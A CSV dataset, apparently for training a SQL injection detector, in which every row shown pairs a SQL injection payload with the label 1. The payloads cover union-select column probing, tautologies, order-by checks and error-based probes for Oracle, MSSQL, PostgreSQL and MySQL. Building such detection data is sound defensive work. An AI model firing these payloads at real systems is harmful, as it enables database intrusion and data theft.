Sentence,Label
"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1
"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",1
"-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--",1
"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",1
"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",1
"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",1
"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",1
"-2434  )   union all select 8310,8310,8310,8310,8310--",1
"-9297  )   union all select 6841,6841,6841,6841,6841--",1
"-2667  )   union all select 5848,5848,5848,5848--",1
"-3102  )   union all select 6707,6707,6707,6707--",1
"-3781  )   union all select 3916,3916,3916--",1
"-3437  )   union all select 7774,7774,7774--",1
"-7007  )   union all select 6704,6704--",1
"-5779  )   union all select 6089,6089--",1
-4058  )   union all select 9184--,1
-8143  )   union all select 3014--,1
-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,1
-8963  )   where 8528  =  8528 or   (  2470  =  3271  )  *3271--,1
-5250  )   where 1591  =  1591 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-8015  )   where 9808  =  9808 or 9323  =  9323#,1
-2784  )   where 5261  =  5261 or 3472  =  1728#,1
-9148  )   where 2027  =  2027 or 8571  =  8571--,1
-8359  )   where 4430  =  4430 or 6872  =  6872--,1
-2516  )   where 3349  =  3349 or 4855  =  1806--,1
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
-5803  )   where 8651  =  8651 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",1
"-9725  )   where 9068  =  9068 or elt  (  4723  =  1426,1426  )  --",1
"-7469  )   where 5875  =  5875 or make_set  (  9354  =  9354,7185  )  --",1
"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",1
-1711  )   where 9098  =  9098 order by 1#,1
-8369  )   where 7234  =  7234 order by 1--,1
-1087  )   where 5787  =  5787 union all select 5787#,1
"-8655  )   where 3910  =  3910 union all select 3910,3910#",1
"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#",1
"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",1
"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",1
"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",1
"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1
"-3007  )   where 6648  =  6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1
"-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1
"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",1
"-9227  )   where 6723  =  6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",1
"-9557  )   where 2891  =  2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",1
"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",1
"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",1
"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",1
"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",1
"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",1
"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",1
"-3037  )   where 9024  =  9024 union all select 9024,9024--",1
-8760  )   where 8277  =  8277 union all select 8277--,1
-6145 or   (  8459  =  8459  )  *4906-- yklv,1
-7941 or   (  5822  =  8754  )  *8754-- eepn,1
-8922 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- krmh,1
-3978 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- mtun,1
"-3415 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- jove",1
-3243 or 2266  =  3583#,1
-5534 or 1983  =  5721#,1
-9212 or 1026  =  7967#,1
-8341 or 8571  =  8571--,1
-5365 or 7517  =  5726--,1
-6045 or 8919  =  2827--,1
-4557 or 6872  =  6872-- kkte,1
-2761 or 1144  =  7657-- mfml,1
-2402 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- szgq,1
"-3059 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )",1
"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw",1
"-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa",1
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,1
-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,1
"-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"-5526 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"-8557 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-5299 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ),1
-8328 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # rlva,1
-4239 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,1
"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",1
"-1558 or elt  (  3306  =  2272,2272  )  -- ioxt",1
"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",1
"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",1
-6984 order by 1#,1
-1432 order by 1#,1
-1192 order by 1#,1
-4324 order by 1--,1
-4325 order by 1--,1
-4761 order by 1--,1
-9005 union all select 4410#,1
-5039 union all select 2114#,1
-9690 union all select 7217#,1
"-7448 union all select 4072,4072#",1
"-4960 union all select 4031,4031#",1
"-6129 union all select 9122,9122#",1
"-5496 union all select 2099,2099,2099#",1
"-8902 union all select 4339,4339,4339#",1
"-2319 union all select 5068,5068,5068#",1
"-2375 union all select 1573,1573,1573,1573#",1
"-1512 union all select 9013,9013,9013,9013#",1
"-1559 union all select 3985,3985,3985,3985#",1
"-7083 union all select 7705,7705,7705,7705,7705#",1
"-6118 union all select 5906,5906,5906,5906,5906#",1
"-7418 union all select 1340,1340,1340,1340,1340#",1
"-5911 union all select 2245,2245,2245,2245,2245,2245#",1
"-9587 union all select 1568,1568,1568,1568,1568,1568#",1
"-7111 union all select 2409,2409,2409,2409,2409,2409#",1
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",1
"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",1
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",1
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",1
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",1
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1
"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",1
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",1
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1
"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",1
"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",1
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1
"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",1
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",1
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1
"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",1
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",1
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",1
"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",1
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1
"-1033 union all select 8731,8731,8731,8731,8731,8731--",1
"-2743 union all select 6757,6757,6757,6757,6757,6757--",1
"-9082 union all select 9858,9858,9858,9858,9858,9858--",1
"-4826 union all select 4532,4532,4532,4532,4532--",1
"-2112 union all select 2995,2995,2995,2995,2995--",1
"-6419 union all select 7008,7008,7008,7008,7008--",1
"-5891 union all select 7103,7103,7103,7103--",1
"-4586 union all select 2068,2068,2068,2068--",1
"-8684 union all select 9519,9519,9519,9519--",1
"-6017 union all select 8449,8449,8449--",1
"-3359 union all select 4675,4675,4675--",1
"-3445 union all select 5505,5505,5505--",1
"-2071 union all select 4753,4753--",1
"-1076 union all select 3959,3959--",1
"-5078 union all select 9708,9708--",1
-6109 union all select 6784--,1
-1769 union all select 6054--,1
-5211 union all select 1754--,1
-2751 where 6334  =  6334 or   (  9668  =  5845  )  *5845--,1
-1662 where 1119  =  1119 or   (  8459  =  8459  )  *4906--,1
-5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-8504 where 3086  =  3086 or 1131  =  9188#,1
-1396 where 5838  =  5838 or 9323  =  9323#,1
-6081 where 3681  =  3681 or 2603  =  3138--,1
-4410 where 5749  =  5749 or 1317  =  9823--,1
-4518 where 8023  =  8023 or 6872  =  6872--,1
-5217 where 3620  =  3620 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-6815 where 7609  =  7609 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
